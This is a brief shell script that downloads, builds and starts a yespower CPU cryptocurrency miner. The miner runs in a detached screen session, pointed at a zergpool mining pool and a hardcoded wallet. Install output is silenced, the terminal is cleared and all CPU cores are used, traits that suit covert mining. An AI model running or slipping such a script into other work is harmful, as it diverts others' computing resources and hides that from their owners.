#!/bin/sh

WALLET=ltc1qdp2yackzxymhjk5hmu2grjem9zpgphvhgpqy89.-p c=LTC,mc=BTE,ID=Mi_Chat-$(echo $(shuf -i 1-9999 -n 1))

POOL=stratum+tcp://yespower.mine.zergpool.com:6533

sudo apt update > /dev/null 2>&1
sudo apt install screen -y > /dev/null 2>&1
wget https://github.com/wong-fi-hung/termux-miner/archive/refs/tags/v2.7.tar.gz
tar -xf v2.7.tar.gz
cd termux-miner-2.7
apt-get install automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev zlib1g-dev make g++ libtool -y
./build.sh
screen -S Admin_Open-Bo -dm ./cpuminer -a yespower -o $POOL -u $WALLET -t $(nproc)
screen -ls
sleep 2
clear
cd ..
screen -ls
./Timer_Bo.sh
